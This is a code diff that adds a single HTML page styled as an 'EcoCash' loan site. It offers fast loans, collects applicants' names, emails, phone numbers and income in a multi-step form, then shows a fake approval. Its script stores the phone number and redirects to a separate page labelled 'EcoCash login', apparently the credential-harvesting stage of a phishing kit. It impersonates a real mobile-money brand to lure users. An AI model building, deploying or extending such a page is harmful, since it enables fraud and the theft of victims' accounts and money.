@@ -1,0 +1,913 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>EcoCash Loan </title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: #e9e9ec;
+    margin:0;
+    width:100%;
+    overflow-x:hidden;
+    padding:0;
+  }
+  .phone {
+    width: 100%;
+    max-width: 720px;
+    background: #e9e9ec;
+    min-height: 100dvh;
+  }
+  header {
+    background: #f7f7f8;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 18px 24px;
+    border-bottom: 1px solid #e2e2e5;
+  }
+  .logo {
+    font-size: 24px;
+    font-weight: 700;
+  }
+  .logo .eco { color: #3b5bdb; }
+  .logo .cash { color: #e64980; }
+  .menu-icon {
+    display: flex;
+    flex-direction: column;
+    gap: 5px;
+  }
+  .menu-icon span {
+    width: 26px;
+    height: 3px;
+    background: #333;
+    border-radius: 2px;
+  }
+  .card {
+    background: #fff;
+    margin: 24px 24px 0;
+    border-radius: 20px;
+    padding: 28px 24px 32px;
+    box-shadow: 0 2px 12px rgba(0,0,0,0.04);
+  }
+  h1 {
+    font-size: 26px;
+    font-weight: 700;
+    color: #1a1a1a;
+    margin-bottom: 8px;
+  }
+  .subtitle {
+    color: #666;
+    font-size: 15px;
+    margin-bottom: 24px;
+  }
+  .calc-box {
+    background: #f4f5f7;
+    border-radius: 16px;
+    padding: 24px 20px;
+  }
+  .calc-title {
+    font-size: 19px;
+    font-weight: 700;
+    color: #1a1a1a;
+    margin-bottom: 20px;
+  }
+  .field-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: baseline;
+    margin-bottom: 10px;
+  }
+  .field-label {
+    color: #333;
+    font-size: 15px;
+  }
+  .field-value {
+    color: #4c5fd5;
+    font-size: 20px;
+    font-weight: 700;
+  }
+  input[type="range"] {
+    -webkit-appearance: none;
+    width: 100%;
+    height: 4px;
+    border-radius: 2px;
+    background: #d5d6da;
+    outline: none;
+    margin: 12px 0 4px;
+  }
+  input[type="range"]::-webkit-slider-thumb {
+    -webkit-appearance: none;
+    width: 22px;
+    height: 22px;
+    border-radius: 50%;
+    background: #4c5fd5;
+    cursor: pointer;
+    box-shadow: 0 1px 4px rgba(0,0,0,0.25);
+  }
+  input[type="range"]::-moz-range-thumb {
+    width: 22px;
+    height: 22px;
+    border-radius: 50%;
+    background: #4c5fd5;
+    cursor: pointer;
+    border: none;
+    box-shadow: 0 1px 4px rgba(0,0,0,0.25);
+  }
+  .range-labels {
+    display: flex;
+    justify-content: space-between;
+    color: #888;
+    font-size: 14px;
+    margin-bottom: 24px;
+  }
+  .payment-box {
+    background: #fff;
+    border: 1px solid #e2e2e5;
+    border-radius: 12px;
+    padding: 20px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-top: 4px;
+  }
+  .payment-label {
+    color: #333;
+    font-size: 16px;
+  }
+  .payment-value {
+    color: #4c5fd5;
+    font-size: 26px;
+    font-weight: 700;
+  }
+  .apply-btn {
+    width: 100%;
+    margin-top: 28px;
+    padding: 18px;
+    border: none;
+    border-radius: 14px;
+    background: linear-gradient(90deg, #4c5fd5, #a742c9);
+    color: #fff;
+    font-size: 16px;
+    font-weight: 700;
+    letter-spacing: 0.5px;
+    cursor: pointer;
+    transition: opacity 0.2s;
+  }
+  .apply-btn:hover { opacity: 0.9; }
+  .feature-list {
+    margin: 28px 24px 40px;
+  }
+  .feature {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    padding: 16px 0;
+  }
+  .feature-icon {
+    font-size: 26px;
+    width: 40px;
+    text-align: center;
+  }
+  .feature-title {
+    font-weight: 700;
+    color: #1a1a1a;
+    font-size: 15px;
+  }
+  .feature-desc {
+    color: #999;
+    font-size: 14px;
+    margin-left: 8px;
+  }
+
+  /* Screen switching */
+  .screen { display: none; }
+  .screen.active { display: block; }
+
+  /* Back header */
+  .back-link {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-size: 18px;
+    font-weight: 700;
+    color: #1a1a1a;
+    background: none;
+    border: none;
+    cursor: pointer;
+    padding: 0;
+  }
+  .header-title {
+    font-size: 24px;
+    font-weight: 700;
+  }
+  .header-spacer { width: 26px; }
+
+  /* Application form */
+  .app-card {
+    background: #fff;
+    margin: 24px 24px 40px;
+    border-radius: 20px;
+    padding: 32px 24px 36px;
+    box-shadow: 0 2px 12px rgba(0,0,0,0.04);
+  }
+  .app-title {
+    text-align: center;
+    font-size: 24px;
+    font-weight: 700;
+    color: #1a1a1a;
+    margin-bottom: 6px;
+  }
+  .app-step {
+    text-align: center;
+    color: #888;
+    font-size: 15px;
+    margin-bottom: 20px;
+  }
+  .progress-track {
+    display: flex;
+    gap: 8px;
+    margin-bottom: 32px;
+  }
+  .progress-seg {
+    flex: 1;
+    height: 5px;
+    border-radius: 3px;
+    background: #dcdde1;
+  }
+  .progress-seg.filled { background: #4c5fd5; }
+
+  .form-group { margin-bottom: 22px; }
+  .form-label {
+    display: block;
+    font-weight: 700;
+    color: #1a1a1a;
+    font-size: 15px;
+    margin-bottom: 10px;
+  }
+  .form-select, .form-input, .form-textarea {
+    width: 100%;
+    border: 1px solid #dcdde1;
+    border-radius: 12px;
+    padding: 16px;
+    font-size: 16px;
+    color: #1a1a1a;
+    font-family: inherit;
+    background: #fff;
+    outline: none;
+  }
+  .form-select {
+    appearance: none;
+    -webkit-appearance: none;
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='14' height='9' viewBox='0 0 14 9'%3E%3Cpath d='M1 1l6 6 6-6' stroke='%23333' stroke-width='2' fill='none' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
+    background-repeat: no-repeat;
+    background-position: right 16px center;
+    cursor: pointer;
+  }
+  .form-select:focus, .form-input:focus, .form-textarea:focus {
+    border-color: #4c5fd5;
+  }
+  .form-textarea {
+    resize: vertical;
+    min-height: 100px;
+    font-family: inherit;
+  }
+  .form-textarea::placeholder, .form-input::placeholder {
+    color: #aaa;
+  }
+  .next-btn {
+    width: 100%;
+    margin-top: 12px;
+    padding: 18px;
+    border: none;
+    border-radius: 14px;
+    background: linear-gradient(90deg, #4c5fd5, #a742c9);
+    color: #fff;
+    font-size: 16px;
+    font-weight: 700;
+    letter-spacing: 0.5px;
+    cursor: pointer;
+    transition: opacity 0.2s;
+  }
+  .next-btn:hover { opacity: 0.9; }
+
+  .phone-row {
+    display: flex;
+    gap: 10px;
+  }
+  .phone-code {
+    flex-shrink: 0;
+    width: 90px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: #f0f0f2;
+    border: 1px solid #dcdde1;
+    border-radius: 12px;
+    font-weight: 700;
+    color: #1a1a1a;
+    font-size: 16px;
+  }
+  .form-hint {
+    color: #888;
+    font-size: 13px;
+    margin-top: 8px;
+  }
+  .prev-btn {
+    width: 100%;
+    margin-top: 12px;
+    padding: 18px;
+    border: none;
+    border-radius: 14px;
+    background: #e9e9ec;
+    color: #444;
+    font-size: 16px;
+    font-weight: 700;
+    letter-spacing: 0.5px;
+    cursor: pointer;
+    transition: opacity 0.2s;
+  }
+  .prev-btn:hover { opacity: 0.85; }
+
+  .summary-box {
+    background: #f4f5f7;
+    border-radius: 16px;
+    padding: 22px 20px 8px;
+    margin-top: 8px;
+  }
+  .summary-title {
+    font-size: 19px;
+    font-weight: 700;
+    color: #1a1a1a;
+    margin-bottom: 16px;
+  }
+  .summary-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 14px 0;
+    border-bottom: 1px solid #e2e2e5;
+  }
+  .summary-row:last-child { border-bottom: none; }
+  .summary-label {
+    color: #888;
+    font-size: 15px;
+  }
+  .summary-value {
+    color: #1a1a1a;
+    font-size: 16px;
+    font-weight: 700;
+    text-align: right;
+  }
+  .submit-btn {
+    width: 100%;
+    margin-top: 12px;
+    padding: 18px;
+    border: none;
+    border-radius: 14px;
+    background: #6a93f5;
+    color: #fff;
+    font-size: 16px;
+    font-weight: 700;
+    letter-spacing: 0.5px;
+    cursor: pointer;
+    transition: opacity 0.2s;
+  }
+  .submit-btn:hover { opacity: 0.9; }
+  footer {
+    text-align: center;
+    color: #999;
+    font-size: 14px;
+    padding: 24px;
+  }
+
+  /* Toast notification */
+  .toast {
+    position: fixed;
+    top: 24px;
+    left: 50%;
+    transform: translateX(-50%) translateY(-20px);
+    background: #1a2233;
+    color: #fff;
+    padding: 16px 22px;
+    border-radius: 14px;
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    max-width: 460px;
+    width: calc(100% - 48px);
+    box-shadow: 0 8px 24px rgba(0,0,0,0.25);
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 0.3s ease, transform 0.3s ease;
+    z-index: 100;
+  }
+  .toast.show {
+    opacity: 1;
+    transform: translateX(-50%) translateY(0);
+  }
+  .toast-check {
+    flex-shrink: 0;
+    width: 24px;
+    height: 24px;
+    border-radius: 50%;
+    background: #2ecc71;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 13px;
+    margin-top: 2px;
+  }
+  .toast-text {
+    font-size: 15px;
+    line-height: 1.4;
+  }
+
+  /* Success screen */
+  .success-card {
+    background: #fff;
+    margin: 24px 24px 40px;
+    border-radius: 20px;
+    padding: 48px 28px 40px;
+    box-shadow: 0 2px 12px rgba(0,0,0,0.04);
+    text-align: center;
+  }
+  .success-icon {
+    width: 90px;
+    height: 90px;
+    border-radius: 50%;
+    background: #2ecc71;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 24px;
+    box-shadow: 0 0 0 14px rgba(46, 204, 113, 0.12);
+  }
+  .success-icon svg { width: 42px; height: 42px; }
+  .success-title {
+    color: #2ecc71;
+    font-size: 26px;
+    font-weight: 700;
+    margin-bottom: 20px;
+  }
+  .success-text {
+    color: #666;
+    font-size: 16px;
+    line-height: 1.6;
+    margin-bottom: 8px;
+  }
+  .redirect-box {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 12px;
+    background: #f4f5f7;
+    border-radius: 12px;
+    padding: 16px;
+    margin: 28px 0 20px;
+    color: #4c5fd5;
+    font-size: 15px;
+    font-weight: 600;
+  }
+  .spinner {
+    width: 18px;
+    height: 18px;
+    border: 2.5px solid #d5d9f5;
+    border-top-color: #4c5fd5;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    flex-shrink: 0;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .login-now-btn {
+    padding: 14px 28px;
+    border: 1px solid #dcdde1;
+    border-radius: 12px;
+    background: #fff;
+    color: #333;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+  }
+  .login-now-btn:hover { background: #f7f7f8; }
+
+@media(max-width:768px){
+html,body{overflow-x:hidden;-webkit-text-size-adjust:100%}
+.card,.app-card,.success-card{margin:16px;width:auto}
+.phone-row{flex-direction:column}
+.phone-code{width:100%;height:50px}
+.payment-box,.field-row,.summary-row{flex-wrap:wrap;gap:8px}
+.error{color:#d00;font-size:13px;margin-top:4px}
+.invalid{border-color:#d00!important}.error{color:#d00;font-size:13px;margin-top:6px}
+}
+</style>
+
+<style id="mobile-enhancements">
+@media (max-width:768px){
+body{padding:0;margin:0}
+.phone{max-width:100%;min-height:100vh}
+header{padding:14px 16px}
+.card,.app-card,.success-card{margin:12px;padding:20px;border-radius:16px}
+h1{font-size:22px}
+.subtitle{font-size:14px}
+.field-row,.payment-box,.summary-row{display:block}
+.payment-value,.field-value{display:block;margin-top:6px}
+input,select,textarea,button{font-size:16px}
+.apply-btn,.next-btn,.prev-btn,.submit-btn,.login-now-btn{min-height:52px}
+.phone-row{display:block}
+.phone-code{width:100%;margin-bottom:8px;height:50px}
+}
+</style>
+
+</head>
+<body>
+<div class="phone">
+
+  <!-- ===== HOME / CALCULATOR SCREEN ===== -->
+  <div class="screen active" id="homeScreen">
+  <header>
+    <div class="logo"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+    <div class="menu-icon"><span></span><span></span><span></span></div>
+  </header>
+
+  <div class="card">
+    <h1>Get Your Loan Approved Fast</h1>
+    <p class="subtitle">Quick approval &middot; Competitive rates &middot; Flexible terms</p>
+
+    <div class="calc-box">
+      <div class="calc-title">Loan Calculator</div>
+
+      <div class="field-row">
+        <span class="field-label">Loan Amount</span>
+        <span class="field-value" id="amountValue">$5,000</span>
+      </div>
+      <input type="range" id="amountSlider" min="100" max="5000" step="50" value="5000">
+      <div class="range-labels"><span>$100</span><span>$5,000</span></div>
+
+      <div class="field-row">
+        <span class="field-label">Loan Term</span>
+        <span class="field-value" id="termValue">12 months</span>
+      </div>
+      <input type="range" id="termSlider" min="6" max="60" step="1" value="12">
+      <div class="range-labels"><span>6 months</span><span>60 months</span></div>
+
+      <div class="payment-box">
+        <span class="payment-label">Monthly Payment</span>
+        <span class="payment-value" id="paymentValue">$450.00</span>
+      </div>
+    </div>
+
+    <button class="apply-btn" id="applyBtn">APPLY NOW</button>
+  </div>
+
+  <div class="feature-list">
+    <div class="feature">
+      <div class="feature-icon">⚡</div>
+      <div><span class="feature-title">Fast Approval</span><span class="feature-desc">Within 24 hours</span></div>
+    </div>
+    <div class="feature">
+      <div class="feature-icon">💰</div>
+      <div><span class="feature-title">Low Rates</span><span class="feature-desc">From 8%</span></div>
+    </div>
+    <div class="feature">
+      <div class="feature-icon">🔒</div>
+      <div><span class="feature-title">Secure</span><span class="feature-desc">Bank-level</span></div>
+    </div>
+  </div>
+  </div>
+  <!-- ===== END HOME SCREEN ===== -->
+
+  <!-- ===== LOAN APPLICATION SCREEN ===== -->
+  <div class="screen" id="applicationScreen">
+    <header>
+      <button class="back-link" id="backBtn">&larr; Back</button>
+      <div class="header-title logo"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+      <div class="menu-icon"><span></span><span></span><span></span></div>
+    </header>
+
+    <div class="app-card">
+      <div class="app-title">Loan Application</div>
+      <div class="app-step">Step 1 of 3</div>
+
+      <div class="progress-track">
+        <div class="progress-seg filled"></div>
+        <div class="progress-seg"></div>
+        <div class="progress-seg"></div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="loanType">Loan Type</label>
+        <select class="form-select" id="loanType">
+          <option>Personal Loan</option>
+          <option>Business Loan</option>
+          <option>Emergency Loan</option>
+          <option>Education Loan</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="loanAmountInput">Loan Amount ($)</label>
+        <input type="number" class="form-input" id="loanAmountInput" value="5000">
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="loanTermSelect">Loan Term</label>
+        <select class="form-select" id="loanTermSelect">
+          <option>6 Months</option>
+          <option selected>12 Months</option>
+          <option>24 Months</option>
+          <option>36 Months</option>
+          <option>60 Months</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="loanPurpose">Purpose of Loan</label>
+        <textarea class="form-textarea" id="loanPurpose" placeholder="What will you use the loan for?"></textarea>
+      </div>
+
+      <button class="next-btn" id="nextStepBtn">NEXT STEP</button>
+    </div>
+  </div>
+  <!-- ===== END APPLICATION SCREEN (STEP 1) ===== -->
+
+  <!-- ===== PERSONAL DETAILS SCREEN (STEP 2) ===== -->
+  <div class="screen" id="personalScreen">
+    <header>
+      <button class="back-link" id="backBtn2">&larr; Back</button>
+      <div class="header-title logo"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+      <div class="menu-icon"><span></span><span></span><span></span></div>
+    </header>
+
+    <div class="app-card">
+      <div class="app-title">Loan Application</div>
+      <div class="app-step">Step 2 of 3</div>
+
+      <div class="progress-track">
+        <div class="progress-seg filled"></div>
+        <div class="progress-seg filled"></div>
+        <div class="progress-seg"></div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="firstName">First Name</label>
+        <input type="text" class="form-input" id="firstName" placeholder="John">
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="lastName">Last Name</label>
+        <input type="text" class="form-input" id="lastName" placeholder="Doe">
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="emailAddress">Email Address</label>
+        <input type="email" class="form-input" id="emailAddress" placeholder="john.doe@example.com">
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="phoneNumber">Phone Number</label>
+        <div class="phone-row">
+          <div class="phone-code">+263</div>
+          <input type="tel" class="form-input" id="phoneNumber" placeholder="123456789">
+        </div>
+        <div class="form-hint">Enter 9-10 digits (e.g., 123456789)</div>
+      </div>
+
+      <button class="prev-btn" id="prevStepBtn2">PREVIOUS</button>
+      <button class="next-btn" id="nextStepBtn2">NEXT STEP</button>
+    </div>
+  </div>
+  <!-- ===== END PERSONAL DETAILS SCREEN ===== -->
+
+  <!-- ===== FINANCIAL DETAILS SCREEN (STEP 3) ===== -->
+  <div class="screen" id="financialScreen">
+    <header>
+      <button class="back-link" id="backBtn3">&larr; Back</button>
+      <div class="header-title logo"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+      <div class="menu-icon"><span></span><span></span><span></span></div>
+    </header>
+
+    <div class="app-card">
+      <div class="app-title">Loan Application</div>
+      <div class="app-step">Step 3 of 3</div>
+
+      <div class="progress-track">
+        <div class="progress-seg filled"></div>
+        <div class="progress-seg filled"></div>
+        <div class="progress-seg filled"></div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="employmentStatus">Employment Status</label>
+        <select class="form-select" id="employmentStatus">
+          <option>Employed</option>
+          <option>Self-Employed</option>
+          <option>Unemployed</option>
+          <option>Student</option>
+          <option>Retired</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="annualIncome">Annual Income ($)</label>
+        <input type="number" class="form-input" id="annualIncome" placeholder="50,000">
+      </div>
+
+      <div class="summary-box">
+        <div class="summary-title">Application Summary</div>
+        <div class="summary-row">
+          <span class="summary-label">Loan Amount:</span>
+          <span class="summary-value" id="summaryAmount">$5,000</span>
+        </div>
+        <div class="summary-row">
+          <span class="summary-label">Loan Term:</span>
+          <span class="summary-value" id="summaryTerm">12 Months</span>
+        </div>
+        <div class="summary-row">
+          <span class="summary-label">Purpose:</span>
+          <span class="summary-value" id="summaryPurpose">&mdash;</span>
+        </div>
+        <div class="summary-row">
+          <span class="summary-label">Applicant:</span>
+          <span class="summary-value" id="summaryApplicant">&mdash;</span>
+        </div>
+      </div>
+
+      <button class="prev-btn" id="prevStepBtn3">PREVIOUS</button>
+      <button class="submit-btn" id="submitBtn">SUBMIT APPLICATION</button>
+    </div>
+  </div>
+  <!-- ===== END FINANCIAL DETAILS SCREEN ===== -->
+
+  <!-- ===== SUCCESS SCREEN ===== -->
+  <div class="screen" id="successScreen">
+    <div class="success-card">
+      <div class="success-icon">
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M5 13l4 4L19 7" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <div class="success-title">Loan Application Submitted</div>
+      <p class="success-text">Your loan application has been submitted. Please wait for approval.</p>
+      <p class="success-text">You will receive a confirmation message. For now, proceed to EcoCash.</p>
+
+      <div class="redirect-box">
+        <div class="spinner"></div>
+        <span id="redirectText">Redirecting to EcoCash login in 5s&hellip;</span>
+      </div>
+
+      <button class="login-now-btn" id="goToLoginBtn">Go to Login Now</button>
+    </div>
+  </div>
+  <!-- ===== END SUCCESS SCREEN ===== -->
+
+</div>
+
+<div class="toast" id="toast">
+  <div class="toast-check">✓</div>
+  <div class="toast-text">🎉 Application submitted successfully!</div>
+</div>
+
+<footer>&copy; 2026 Ecocash</footer>
+
+<script>
+  const amountSlider = document.getElementById('amountSlider');
+  const termSlider = document.getElementById('termSlider');
+  const amountValue = document.getElementById('amountValue');
+  const termValue = document.getElementById('termValue');
+  const paymentValue = document.getElementById('paymentValue');
+
+  const ANNUAL_RATE = 0.08;
+
+  function formatCurrency(n) {
+    return '$' + n.toLocaleString('en-US', { minimumFractionDigits: 0, maximumFractionDigits: 0 });
+  }
+
+  function calculatePayment() {
+    const principal = parseFloat(amountSlider.value);
+    const months = parseInt(termSlider.value);
+    const monthlyRate = ANNUAL_RATE / 12;
+
+    let payment;
+    if (monthlyRate === 0) {
+      payment = principal / months;
+    } else {
+      payment = principal * (monthlyRate * Math.pow(1 + monthlyRate, months)) /
+                (Math.pow(1 + monthlyRate, months) - 1);
+    }
+
+    amountValue.textContent = formatCurrency(principal);
+    termValue.textContent = months + ' months';
+    paymentValue.textContent = '$' + payment.toFixed(2);
+  }
+
+  amountSlider.addEventListener('input', calculatePayment);
+  termSlider.addEventListener('input', calculatePayment);
+
+  calculatePayment();
+
+  
+function fieldContainer(el){return el.closest('.form-group')||el.parentElement;}
+function clearError(el){el.classList.remove('invalid');const c=fieldContainer(el);const e=c.querySelector('.error');if(e)e.remove();}
+function showError(el,msg){clearError(el);el.classList.add('invalid');const d=document.createElement('div');d.className='error';d.textContent=msg;fieldContainer(el).appendChild(d);el.focus();return false;}
+document.addEventListener('input',e=>{if(e.target.matches('.form-input,.form-textarea,.form-select'))clearError(e.target);},true);
+
+// ----- Screen navigation -----
+  const homeScreen = document.getElementById('homeScreen');
+  const applicationScreen = document.getElementById('applicationScreen');
+  const personalScreen = document.getElementById('personalScreen');
+  const financialScreen = document.getElementById('financialScreen');
+  const successScreen = document.getElementById('successScreen');
+  const applyBtn = document.getElementById('applyBtn');
+  const backBtn = document.getElementById('backBtn');
+  const backBtn2 = document.getElementById('backBtn2');
+  const backBtn3 = document.getElementById('backBtn3');
+  const loanAmountInput = document.getElementById('loanAmountInput');
+  const loanTermSelect = document.getElementById('loanTermSelect');
+  const loanPurpose = document.getElementById('loanPurpose');
+  const firstName = document.getElementById('firstName');
+  const lastName = document.getElementById('lastName');
+  const nextStepBtn = document.getElementById('nextStepBtn');
+  const prevStepBtn2 = document.getElementById('prevStepBtn2');
+  const nextStepBtn2 = document.getElementById('nextStepBtn2');
+  const prevStepBtn3 = document.getElementById('prevStepBtn3');
+  const submitBtn = document.getElementById('submitBtn');
+  const summaryAmount = document.getElementById('summaryAmount');
+  const summaryTerm = document.getElementById('summaryTerm');
+  const summaryPurpose = document.getElementById('summaryPurpose');
+  const summaryApplicant = document.getElementById('summaryApplicant');
+
+  function showScreen(screenToShow) {
+    [homeScreen, applicationScreen, personalScreen, financialScreen, successScreen].forEach(s => s.classList.remove('active'));
+    screenToShow.classList.add('active');
+    window.scrollTo(0, 0);
+  }
+
+  applyBtn.addEventListener('click', () => {
+    // Carry over the values chosen on the calculator
+    loanAmountInput.value = amountSlider.value;
+    const termMonths = termSlider.value;
+    const termOption = [...loanTermSelect.options].find(o => o.value.startsWith(termMonths + ' '));
+    if (termOption) {
+      loanTermSelect.value = termOption.value;
+    }
+    showScreen(applicationScreen);
+  });
+
+  backBtn.addEventListener('click', () => showScreen(homeScreen));
+
+  nextStepBtn.addEventListener('click',()=>{if(!loanAmountInput.value||Number(loanAmountInput.value)<=0){return showError(loanAmountInput,'Please enter a valid loan amount.');}if(!loanPurpose.value.trim()){return showError(loanPurpose,'Please enter the purpose of the loan.');}showScreen(personalScreen);});
+
+  backBtn2.addEventListener('click', () => showScreen(applicationScreen));
+  prevStepBtn2.addEventListener('click', () => showScreen(applicationScreen));
+
+  function populateSummary() {
+    const amount = parseFloat(loanAmountInput.value) || 0;
+    summaryAmount.textContent = '$' + amount.toLocaleString('en-US');
+    summaryTerm.textContent = loanTermSelect.value;
+    summaryPurpose.textContent = loanPurpose.value.trim() || '—';
+    const applicantName = (firstName.value.trim() + ' ' + lastName.value.trim()).trim();
+    summaryApplicant.textContent = applicantName ? applicantName.toUpperCase() : '—';
+  }
+
+  nextStepBtn2.addEventListener('click',()=>{const e=document.getElementById('emailAddress'),p=document.getElementById('phoneNumber');if(!firstName.value.trim()){return showError(firstName,'First name is required.');}if(!lastName.value.trim()){return showError(lastName,'Last name is required.');}if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e.value)){return showError(e,'Enter a valid email address.');}if(!/^\d{9,10}$/.test(p.value.trim())){return showError(p,'Phone number must contain 9–10 digits.');}populateSummary();
+    showScreen(financialScreen);
+  });
+
+  backBtn3.addEventListener('click', () => showScreen(personalScreen));
+  prevStepBtn3.addEventListener('click', () => showScreen(personalScreen));
+
+  const toast = document.getElementById('toast');
+  const redirectText = document.getElementById('redirectText');
+  const goToLoginBtn = document.getElementById('goToLoginBtn');
+  let countdownTimer = null;
+
+  function startRedirectCountdown() {
+    let secondsLeft = 5;
+    redirectText.textContent = `Redirecting to EcoCash login in ${secondsLeft}s…`;
+    clearInterval(countdownTimer);
+countdownTimer = setInterval(() => {
+  secondsLeft -= 1;
+  if (secondsLeft <= 0) {
+    clearInterval(countdownTimer);
+    localStorage.setItem('phone', document.getElementById('phoneNumber').value.trim());
+    window.location.href = 'deno.html';
+  } else {
+        redirectText.textContent = `Redirecting to EcoCash login in ${secondsLeft}s…`;
+      }
+    }, 1000);
+  }
+
+  submitBtn.addEventListener('click',()=>{const i=document.getElementById('annualIncome');if(!i.value||Number(i.value)<=0){return showError(i,'Please enter your annual income.');}showScreen(successScreen);
+    startRedirectCountdown();
+
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 3500);
+  });
+
+  goToLoginBtn.addEventListener('click',()=>{clearInterval(countdownTimer);localStorage.setItem('phone',document.getElementById('phoneNumber').value.trim());window.location.href='deno.html';});
+</script>
+</body>
+</html>
